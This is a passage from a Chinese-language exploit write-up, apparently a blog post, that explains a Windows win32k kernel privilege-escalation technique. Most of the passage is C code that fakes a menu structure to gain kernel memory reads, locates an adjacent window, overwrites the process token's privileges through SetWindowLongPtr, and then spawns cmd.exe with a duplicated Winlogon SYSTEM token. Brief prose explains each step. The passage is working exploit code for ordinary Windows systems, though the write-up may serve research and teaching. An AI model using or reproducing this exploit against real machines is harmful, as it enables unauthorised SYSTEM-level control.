<span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token function">SetWindowLong</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> TAGWND_BODY_STYLE_OFF<span class="token punctuation">,</span> <span class="token number">0x40c00000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的spmenu载入到tagWND-&gt;spmenu要调用SetWindowLongPtr中的xxxSetWindowData</span><span class="token comment">//而调用xxxSetWindowData，需要tagWNDk-&gt;style包含WPCCHILD</span>pFakeMenu <span class="token operator">=</span> <span class="token punctuation">(</span>PULONG_PTR<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>pFakeMenuBody <span class="token operator">=</span> <span class="token punctuation">(</span>PULONG_PTR<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>pFakeItems <span class="token operator">=</span> <span class="token punctuation">(</span>PULONG_PTR<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> MEM_COMMIT <span class="token operator">|</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//给各个自定义结构申请内存</span><span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> GWLP_ID<span class="token punctuation">,</span> <span class="token punctuation">(</span>LONG_PTR<span class="token punctuation">)</span>pFakeMenu<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//当参数2为WS_CHILD时，我们才可以调用SetWindowLongPtr将参数3指定的地址(pFakeMenu)写入到tagWND-&gt;spmenu</span><span class="token function">SetWindowLong</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> TAGWND_BODY_STYLE_OFF<span class="token punctuation">,</span> <span class="token number">0x04c00000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 载入spmenu后就style就不需要为0x40c00000了，style需要恢复原数据</span><span class="token comment">// 构造符合正常执行GetMenuBarInfo且把pFakeItems当作读取地址的spmenu</span>pFakeMenu<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token operator">&amp;</span>ulFakeHandle<span class="token punctuation">;</span>pFakeMenu<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFakeMenuBody<span class="token punctuation">;</span>                <span class="token comment">// fake body</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PULONG<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pFakeMenuBody<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffff</span><span class="token punctuation">;</span>              <span class="token comment">// make items count to max</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PULONG<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pFakeMenu<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                       <span class="token comment">// make menu'x to 1，这是构造正常的spmenu必须的参数</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PULONG<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pFakeMenu<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                       <span class="token comment">// make menu'y to 1，这是构造正常的spmenu必须的参数</span>pFakeMenu<span class="token punctuation">[</span><span class="token number">0xb</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFakeItems<span class="token punctuation">;</span>                 <span class="token comment">// 这个就是读取的地址（详情看GetMenuBarInfo分析）</span>ulFakeRefCount<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFakeMenu<span class="token punctuation">;</span>pFakeMenu<span class="token punctuation">[</span><span class="token number">0x13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token operator">&amp;</span>ulFakeRefCount<span class="token punctuation">;</span><span class="token comment">//开始一步一步根据内核结构联系拿到内核桌面堆地址</span><span class="token punctuation">{</span>    ULONG_PTR ulAddr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     ULONG_PTR ulValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ulAddr <span class="token operator">=</span> <span class="token function">GetCurThreadObjAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ulAddr<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    pFakeItems<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ulAddr <span class="token operator">+</span> ETHREAD_WIN32THREAD_OFF <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 泄露地址-0x40</span>    ulValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ulValue <span class="token operator">=</span> <span class="token function">ReadPrimitive</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>    pFakeItems<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ulValue <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                ulValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ulValue <span class="token operator">=</span> <span class="token function">ReadPrimitive</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>    pFakeItems<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ulValue <span class="token operator">+</span> WIN32THREAD_DESKTOP_OFF <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ulValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ulValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ulValue <span class="token operator">=</span> <span class="token function">ReadPrimitive</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>    pFakeItems<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ulValue <span class="token operator">+</span> DESKTOP_HEAPBASE_OFF <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ulValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ulValue <span class="token operator">=</span> <span class="token function">ReadPrimitive</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>    ulDesktopHeapBase <span class="token operator">=</span> ulValue<span class="token punctuation">;</span>    <span class="token comment">//内核桌面堆地址</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>spmenu是通过分析GetMenuBarInfo得到的与正常spmenu结构有差异的自定义spmenu，pFakeItems是需要泄露的指针，只要自定义pFakeItems，就可以将根读取到内核桌面堆地址。</p><h3 id="寻找相邻窗口"><a href="#寻找相邻窗口" class="headerlink" title="寻找相邻窗口"></a>寻找相邻窗口</h3><pre class="line-numbers language-none"><code class="language-none">//找相邻端口for (ULONG ulIndex = 0x0; ulIndex &lt; 0x30; ulIndex += 8) {pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + ulTagWndBodySize + ulIndex - 0x40);//两个相邻的窗口地址差是一个tagWNDK结构体大小，循环计数来偏差定位ulValue = 0;ulValue = ReadPrimitive(hTargetWnd);//tagWNDK首地址内容是相邻窗口句柄值if (ulValue == (ULONG_PTR)hAdjacentWnd) {bAdjacent = TRUE;ulTagWndBodySize += ulIndex;break;}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ulDesktopHeapBase + ulWndOffset表示目标窗口在内核层的地址</p><p>目标窗口已经将tagWND空间偏移设置为pExtraBytes,在相邻窗口可以配置进程Token空间偏移作为pExtraBytes对进程Token空间进行读写。</p><h3 id="使用DataOnlyAttack进行提权"><a href="#使用DataOnlyAttack进行提权" class="headerlink" title="使用DataOnlyAttack进行提权"></a>使用DataOnlyAttack进行提权</h3><p>win10 1708之后，不仅需要修改当前进程特权，还需要调整当前token中的UserAndGroups和管理员相同，才能发生提权。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ULONG_PTR <span class="token function">GetCurTokenObjAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">//获取进程的Token地址</span>    HANDLE hProc<span class="token punctuation">;</span> <span class="token comment">//进程句柄</span>    HANDLE hToken<span class="token punctuation">;</span> <span class="token comment">//进程的令牌句柄</span>    PVOID pTokenObj<span class="token punctuation">;</span>    hProc <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_QUERY_INFORMATION<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token function">GetCurrentProcessId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">OpenProcessToken</span><span class="token punctuation">(</span>        hProc<span class="token punctuation">,</span>        TOKEN_ASSIGN_PRIMARY <span class="token operator">|</span> TOKEN_DUPLICATE <span class="token operator">|</span> TOKEN_IMPERSONATE <span class="token operator">|</span> TOKEN_QUERY<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>hToken<span class="token punctuation">)</span><span class="token punctuation">;</span>    pTokenObj <span class="token operator">=</span> <span class="token function">GetTargetHandleObject</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcessId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>hToken<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pTokenObj<span class="token punctuation">;</span>    <span class="token comment">//返回Token地址 </span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>bAdjacent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// read adjacent hwnd's flag</span>        pFakeItems<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ulDesktopHeapBase <span class="token operator">+</span> ulWndOffset <span class="token operator">+</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_REL_FLAG_OFF <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//这里是查看相邻窗口tagWNDk的flag的值</span>        ulValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        ulValue <span class="token operator">=</span> <span class="token function">ReadPrimitive</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>        ulTokenObjAddr <span class="token operator">=</span> <span class="token function">GetCurTokenObjAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//进程的Token地址</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> TAGWND_BODY_EXTRA_SIZE_OFF<span class="token punctuation">,</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将cbWndExtra修改到最高</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_REL_FLAG_OFF<span class="token punctuation">,</span> ulValue <span class="token operator">|</span> <span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//配置相邻窗口的flag值存在0x800属性</span>        <span class="token comment">//配置相邻窗口的flag存在0x800属性</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_REL_VALUE_OFF<span class="token punctuation">,</span> ulTokenObjAddr <span class="token operator">-</span> ulDesktopHeapBase<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将进程token地址-内核桌面堆地址的偏移量放到相邻窗口的pExtraBytes</span>        <span class="token comment">//配置相邻窗口的pExtraBytes为</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_EXTRA_SIZE_OFF<span class="token punctuation">,</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将相邻窗口的cbWndExtra修改到最高</span>        <span class="token comment">//配置相邻窗口的cbWndExtra</span>        <span class="token comment">// adjacent wnd can modify token's anything</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hAdjacentWnd<span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hAdjacentWnd<span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetWindowLong</span><span class="token punctuation">(</span>hAdjacentWnd<span class="token punctuation">,</span> <span class="token number">0x498</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetWindowLong</span><span class="token punctuation">(</span>hAdjacentWnd<span class="token punctuation">,</span> <span class="token number">0x498</span> <span class="token operator">+</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0xf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DEBUG_BREAK</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Restore adjacent window</span>        pFakeItems<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ulDesktopHeapBase <span class="token operator">+</span> ulWndOffset <span class="token operator">+</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_REL_FLAG_OFF <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ulValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        ulValue <span class="token operator">=</span> <span class="token function">ReadPrimitive</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_REL_FLAG_OFF<span class="token punctuation">,</span> ulValue <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//删除相邻窗口的flag的0x800属性</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_REL_VALUE_OFF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_EXTRA_SIZE_OFF<span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// our specified size</span>        <span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> TAGWND_BODY_EXTRA_SIZE_OFF<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token comment">// out specified size</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建拷贝进程token的cmd进程"><a href="#创建拷贝进程token的cmd进程" class="headerlink" title="创建拷贝进程token的cmd进程"></a>创建拷贝进程token的cmd进程</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">BOOL <span class="token function">GetProIDByName</span><span class="token punctuation">(</span>PCWCHAR ImageName<span class="token punctuation">,</span> ULONG_PTR<span class="token operator">*</span> ProcIDPtr<span class="token punctuation">)</span><span class="token punctuation">{</span>HANDLE hSnapshot <span class="token operator">=</span> INVALID_HANDLE_VALUE<span class="token punctuation">;</span>PROCESSENTRY32 pe32<span class="token punctuation">;</span>hSnapshot <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hSnapshot <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>pe32<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pe32<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Process32First</span><span class="token punctuation">(</span>hSnapshot<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">do</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">lstrcmpi</span><span class="token punctuation">(</span>ImageName<span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">CloseHandle</span><span class="token punctuation">(</span>hSnapshot<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span>ProcIDPtr <span class="token operator">=</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span><span class="token keyword">return</span> TRUE<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">Process32Next</span><span class="token punctuation">(</span>hSnapshot<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">CloseHandle</span><span class="token punctuation">(</span>hSnapshot<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> FALSE<span class="token punctuation">;</span><span class="token punctuation">}</span>VOID <span class="token function">CreateEopProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>HANDLE hProc<span class="token punctuation">;</span>HANDLE hToken<span class="token punctuation">;</span>HANDLE hEopToken<span class="token punctuation">;</span>ULONG_PTR ulWinlogonPID <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetProIDByName</span><span class="token punctuation">(</span>L<span class="token string">"Winlogon.exe"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ulWinlogonPID<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>ulWinlogonPID<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">;</span>hProc <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_QUERY_INFORMATION<span class="token punctuation">,</span>FALSE<span class="token punctuation">,</span>ulWinlogonPID <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">OpenProcessToken</span><span class="token punctuation">(</span>hProc<span class="token punctuation">,</span>TOKEN_ASSIGN_PRIMARY <span class="token operator">|</span> TOKEN_DUPLICATE <span class="token operator">|</span> TOKEN_IMPERSONATE <span class="token operator">|</span> TOKEN_QUERY<span class="token punctuation">,</span><span class="token operator">&amp;</span>hToken<span class="token punctuation">)</span><span class="token punctuation">;</span>SECURITY_IMPERSONATION_LEVEL seImpersonateLevel <span class="token operator">=</span> SecurityImpersonation<span class="token punctuation">;</span>TOKEN_TYPE tokenType <span class="token operator">=</span> TokenPrimary<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">DuplicateTokenEx</span><span class="token punctuation">(</span>hToken<span class="token punctuation">,</span> MAXIMUM_ALLOWED<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> seImpersonateLevel<span class="token punctuation">,</span> tokenType<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hEopToken<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">/* Starts a new process with SYSTEM token */</span>STARTUPINFOW si <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>PROCESS_INFORMATION pi <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">CreateProcessWithTokenW</span><span class="token punctuation">(</span>hEopToken<span class="token punctuation">,</span>LOGON_NETCREDENTIALS_ONLY<span class="token punctuation">,</span>L<span class="token string">"C:\\Windows\\System32\\cmd.exe"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>CREATE_NEW_CONSOLE<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>si<span class="token punctuation">,</span><span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="恢复环境"><a href="#恢复环境" class="headerlink" title="恢复环境"></a>恢复环境</h3><p>需要还原所有使用SetWindowLong/SetWindowLongStr修改的数据</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pFakeItems<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ulDesktopHeapBase <span class="token operator">+</span> ulWndOffset <span class="token operator">+</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_REL_FLAG_OFF <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//这里是查看相邻窗口tagWNDk的flag的值</span>ulValue <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>ulValue <span class="token operator">=</span> <span class="token function">ReadPrimitive</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里读取相邻窗口上的flag数据（准备被删除0x800属性）</span><span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_REL_FLAG_OFF<span class="token punctuation">,</span> ulValue <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//删除相邻窗口的flag的0x800属性</span><span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_REL_VALUE_OFF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将相邻窗口的扩展内存设置为0</span><span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> ulTagWndBodySize <span class="token operator">+</span> TAGWND_BODY_EXTRA_SIZE_OFF<span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//相邻窗口开始定义窗口的cbWndExtra</span><span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> TAGWND_BODY_EXTRA_SIZE_OFF<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token comment">//目标窗口开始定义窗口的cbWndExtra</span><span class="token punctuation">{</span>ULONG_PTR ulWndOffset <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>ULONG_PTR ulValue <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>ulWndOffset <span class="token operator">=</span> <span class="token function">GetWndObjOffset</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>hTargetWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>pFakeItems<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span><span class="token punctuation">(</span>ulDesktopHeapBase <span class="token operator">+</span> ulWndOffset <span class="token operator">+</span> TAGWND_BODY_REL_FLAG_OFF <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ulValue <span class="token operator">=</span> 